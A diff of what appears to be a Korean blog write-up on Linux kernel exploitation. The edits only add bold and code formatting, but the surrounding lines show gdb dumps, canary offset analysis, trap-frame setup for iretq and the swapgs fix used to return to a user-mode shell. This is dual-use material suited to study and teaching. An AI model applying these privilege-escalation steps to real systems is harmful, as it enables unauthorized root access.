@@ -9,7 +9,7 @@ mermaid: true
 
 ## Set environment
 
-리눅스 배포판, 커널 버전 정보
+**리눅스 배포판, 커널 버전 정보**
 
 ```
 bs@bs-virtual-machine:~/Desktop$ uname -a
@@ -233,7 +233,7 @@ int main()
 }
 ```
 
-copy_to_user() 함수 인자 및 canary와의 거리(0x40)를 확인한다.
+`copy_to_user()` 함수 인자 및 canary와의 거리(0x40)를 확인한다.
 
 ```
 3: x/i $rip
@@ -320,7 +320,7 @@ overflow가 발생하였다.
 0xffff88012b80fed0: 0xffffffff811fda82  0xffffffff81067c27
 ```
 
-64bit tf 생성 후 쉘 실행시키는 코드 작성한다.
+64bit `tf` 생성 후 쉘 실행시키는 코드 작성한다.
 
 ```c
 //gcc -static -o test test.c
@@ -431,7 +431,7 @@ int main()
 }
 ```
 
-iretq 전 rsp(tf)
+**`iretq` 전 `rsp(tf)`**
 
 ```
 1: x/i $rip
@@ -443,7 +443,7 @@ iretq 전 rsp(tf)
 0x6c4ad0:   0xffffffff8109da40  0x0000000000000000
 ```
 
-iret 후 레지스터
+**`iret` 후 레지스터**
 
 ```
 (gdb) si
@@ -477,7 +477,7 @@ fs             0x63                99
 gs             0x0                 0
 ```
 
-본문엔 general_protection() 함수가 호출되지만 나의 경우 커널 패닉(page fault)이 되어버린다.
+본문엔 `general_protection()` 함수가 호출되지만 나의 경우 커널 패닉(page fault)이 되어버린다.
 
 ### General protection fault
 
@@ -563,7 +563,7 @@ idtentry async_page_fault   do_async_page_fault has_error_code=1
 
 위의 에러를 해결하기 위해 SWAPGS 명령어를 이용해 GS레지스터의 값을 변경해야 한다. SWAPGS 명령어는 GS.base의 값을 MSR의 KernelGSbase(C0000102H) 값과 교환하는 명령어이다. * [https://www.felixcloutier.com/x86/swapgs](https://www.felixcloutier.com/x86/swapgs)
 
-payload() 함수에 "swapgs;" 어셈블리 코드를 추가한다.
+`payload()` 함수에 `swapgs;` 어셈블리 코드를 추가한다.
 
 ## Exploit code
 
